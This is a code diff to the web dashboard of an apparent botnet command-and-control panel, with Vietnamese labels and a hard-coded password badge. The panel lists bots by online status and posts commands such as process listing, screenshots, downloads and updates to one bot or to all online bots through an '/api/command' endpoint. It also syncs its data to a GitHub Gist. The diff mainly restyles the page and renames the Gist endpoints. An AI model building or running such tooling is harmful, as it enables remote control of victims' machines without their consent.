@@ -12,6 +12,11 @@
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
         .header h1 { color: #00ff88; text-shadow: 0 0 20px #00ff8855; }
         .password-badge { background: #ff0044; padding: 5px 15px; border-radius: 20px; font-size: 12px; color: white; }
+        .gist-status { font-size: 12px; color: #888; margin-bottom: 10px; }
+        .gist-status .connected { color: #00ff88; }
+        .gist-status .disconnected { color: #ff4444; }
+        .gist-status button { background: none; border: 1px solid #00ff8855; color: #00ff88; padding: 2px 10px; border-radius: 3px; cursor: pointer; font-size: 11px; }
+        .gist-status button:hover { background: #00ff8822; }
         .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }
         .stat-card { background: #1a1a2e; padding: 20px; border-radius: 10px; border: 1px solid #00ff8855; text-align: center; }
         .stat-number { font-size: 32px; font-weight: bold; color: #00ff88; }
@@ -35,14 +40,6 @@
         .modal-content { position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a2e; padding: 30px; border-radius: 10px; max-width: 700px; max-height: 80vh; overflow-y: auto; }
         .modal-content pre { background: #0a0a0f; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; color: #00ff88; max-height: 400px; overflow-y: auto; }
         .close { float: right; cursor: pointer; color: #ff4444; font-size: 24px; }
-        .db-actions { display: flex; gap: 10px; margin: 10px 0; flex-wrap: wrap; }
-        .db-actions button { padding: 8px 15px; background: #1a1a2e; border: 1px solid #00ff8855; color: #00ff88; border-radius: 5px; cursor: pointer; }
-        .db-actions button:hover { background: #00ff8822; }
-        .db-actions button.danger { border-color: #ff4444; color: #ff4444; }
-        .db-actions button.danger:hover { background: #ff444422; }
-        .gist-status { font-size: 12px; color: #888; margin: 5px 0; }
-        .gist-status .connected { color: #00ff88; }
-        .gist-status .disconnected { color: #ff4444; }
     </style>
 </head>
 <body>
@@ -52,11 +49,10 @@
             <div class="password-badge">🔑 H3XTEK0</div>
         </div>
 
-        <div class="gist-status" id="gistStatus">
-            <span>📦 GitHub Gist: </span>
-            <span id="gistStatusText" class="disconnected">Đang kiểm tra...</span>
-            <button onclick="checkGistStatus()" style="background:none;border:1px solid #00ff8855;color:#00ff88;padding:2px 10px;border-radius:3px;cursor:pointer;font-size:11px;">Kiểm tra</button>
-            <button onclick="syncToGist()" style="background:none;border:1px solid #00ff8855;color:#00ff88;padding:2px 10px;border-radius:3px;cursor:pointer;font-size:11px;">🔄 Sync</button>
+        <div class="gist-status">
+            📦 GitHub Gist: <span id="gistStatusText" class="disconnected">Đang kiểm tra...</span>
+            <button onclick="checkGistStatus()">Kiểm tra</button>
+            <button onclick="syncToGist()">🔄 Sync</button>
         </div>
 
         <div class="stats">
@@ -75,7 +71,7 @@
         <div class="cmd-box">
             <input type="text" id="botIdInput" placeholder="Bot ID (để trống cho tất cả)">
             <input type="text" id="cmdInput" placeholder="Lệnh (ps, sc, ping, download, update...)" style="flex: 2;">
-            <input type="text" id="argsInput" placeholder="Args (json array)">
+            <input type="text" id="argsInput" placeholder='Args ["arg1","arg2"]'>
             <button onclick="sendCommand()">🚀 Gửi lệnh</button>
         </div>
 
@@ -209,7 +205,7 @@
             }
 
             const payload = { command, args };
-            let endpoint = '/api/command';
+            
             if (!botId || botId === 'all') {
                 const onlineBots = botsData.filter(b => b.online).map(b => b.bot_id);
                 if (onlineBots.length === 0) {
@@ -226,7 +222,7 @@
                 return;
             }
 
-            const res = await fetch(endpoint, {
+            const res = await fetch('/api/command', {
                 method: 'POST',
                 headers: { ...getAuth(), 'Content-Type': 'application/json' },
                 body: JSON.stringify({ bot_id: botId, ...payload })
@@ -312,14 +308,11 @@
 
         async function checkGistStatus() {
             try {
-                const res = await fetch('/api/db/sync', {
-                    method: 'POST',
-                    headers: getAuth()
-                });
+                const res = await fetch('/api/gist/status', { headers: getAuth() });
                 const data = await res.json();
                 const el = document.getElementById('gistStatusText');
-                if (data.gist) {
-                    el.textContent = '✅ Connected to GitHub Gist';
+                if (data.enabled) {
+                    el.textContent = `✅ Connected (ID: ${data.gist_id})`;
                     el.className = 'connected';
                 } else {
                     el.textContent = '❌ Not configured (set GITHUB_TOKEN & GIST_ID)';
@@ -332,14 +325,14 @@
 
         async function syncToGist() {
             try {
-                const res = await fetch('/api/db/sync', {
+                const res = await fetch('/api/gist/sync', {
                     method: 'POST',
                     headers: getAuth()
                 });
                 const data = await res.json();
-                alert(`✅ Sync completed! Gist: ${data.gist ? 'Connected' : 'Not configured'}`);
+                alert(data.status === 'ok' ? '✅ Synced successfully!' : '❌ Sync failed: ' + data.message);
             } catch (e) {
-                alert('❌ Lỗi sync: ' + e.message);
+                alert('❌ Error: ' + e.message);
             }
         }
 
